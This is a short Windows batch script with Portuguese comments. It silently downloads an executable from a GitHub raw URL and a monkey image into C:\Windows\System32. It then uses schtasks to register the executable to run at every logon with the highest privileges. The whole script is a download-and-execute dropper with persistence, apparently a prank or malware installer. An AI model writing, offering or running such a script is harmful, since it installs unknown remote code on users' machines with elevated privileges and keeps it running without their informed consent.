@echo off
setlocal

REM Definir URLs para download
set "PY_URL=https://github.com/mdsmax/fefipefefotrolagem/raw/src.exe"
set "IMG_URL=https://png.pngtree.com/thumb_back/fh260/background/20230613/pngtree-young-monkey-looking-at-the-camera-with-its-mouth-open-image_2911673.jpg"

REM Definir caminhos locais
set "DOWNLOAD_DIR=C:\Windows\System32"
set "EXE_FILE=%DOWNLOAD_DIR%\script_inicializacao.exe"
set "IMAGE_FILE=%DOWNLOAD_DIR%\macaco.jpg"

REM Baixar o arquivo EXE
echo Baixando script EXE...
curl -o "%EXE_FILE%" "%PY_URL%" --silent
if %ERRORLEVEL% NEQ 0 (
    echo Falha ao baixar o script.
    pause
    exit /b 1
)

REM Baixar a imagem
echo Baixando imagem...
curl -o "%IMAGE_FILE%" "%IMG_URL%" --silent
if %ERRORLEVEL% NEQ 0 (
    echo Falha ao baixar a imagem.
    pause
    exit /b 1
)

REM Adicionar o EXE à inicialização do Windows usando o agendador de tarefas
echo Configurando script para iniciar com o sistema...
schtasks /create /sc onlogon /tn "ScriptInicializacao" /tr "\"%EXE_FILE%\"" /rl highest /f
if %ERRORLEVEL% NEQ 0 (
    echo Falha ao configurar o script para inicialização.
    pause
    exit /b 1
)

echo Instalacao concluida com sucesso!
pause
